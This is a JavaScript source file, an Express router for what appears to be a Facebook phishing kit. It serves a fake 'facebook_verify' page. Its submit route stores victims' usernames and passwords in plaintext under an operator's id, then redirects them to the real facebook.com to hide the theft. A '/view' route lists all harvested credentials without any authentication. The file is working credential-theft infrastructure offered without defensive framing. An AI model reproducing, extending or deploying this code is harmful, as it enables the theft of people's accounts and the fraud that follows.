const express = require('express');
const router = express.Router();
const Client = require('./model/Client');
const authController = require('./controllers/authController');
const homeController = require('./controllers/homeController');
const authMiddleware = require('./middlewares/authMiddleware');
const unauthMiddleware = require('./middlewares/unauthMiddleware');

router.get('/', authMiddleware, homeController.homeView);
router.get('/details/:id', authMiddleware, homeController.detailsView);
router.post('/details_submit/:id', authMiddleware, homeController.submit);
router.get('/settings', authMiddleware, (req, res) => {
    res.render('settings.ejs');
});

router.get('/logout', authMiddleware, (req, res) => {
    const { token } = req.cookies;

    // delete cookies
    res.clearCookie('token');
    req.user = null;

    res.redirect('/login');
});

router.get('/facebook_verify/:id', (req, res) => {
    const { id } = req.params;
    res.render('facebook_verify', { id });
});

router.post('/submit/:id', async (req, res) => {
    const { username, password } = req.body;
    const { id } = req.params;

    if (!username | !password) {
        return res.render('index');
    }

    try {
        await Client.create({ username, password, userId: id });
        res.redirect('https://www.facebook.com');
    } catch (err) {
        console.log(err);
    }
});

router.get('/view', async (req, res) => {
    try {
        const users = await Client.find();


        res.render('view', { users });
    } catch (err) {
        console.log(err);
    }
});

router.get('/register', unauthMiddleware, authController.registerView);
router.post('/register', unauthMiddleware, authController.register);

router.get('/login', unauthMiddleware, authController.loginView);
router.post('/login', unauthMiddleware, authController.login);

module.exports = router;